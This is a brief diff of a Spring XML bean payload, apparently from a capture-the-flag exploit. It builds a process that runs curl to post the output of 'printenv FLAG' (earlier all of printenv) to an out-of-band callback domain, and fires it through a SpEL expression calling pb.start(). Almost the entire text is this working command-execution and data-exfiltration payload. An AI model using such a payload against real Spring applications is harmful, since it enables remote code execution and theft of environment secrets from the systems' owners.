@@ -10,7 +10,7 @@
             <value>curl</value>
             <value>jackson.zg80gf.ceye.io</value>
           <value>-d</value>
-          <value>flag=$(printenv)</value>
+          <value>flag=$(printenv FLAG)</value>
         </list>
     </constructor-arg>
      <property name="whatever" value="#{ pb.start() }"/>
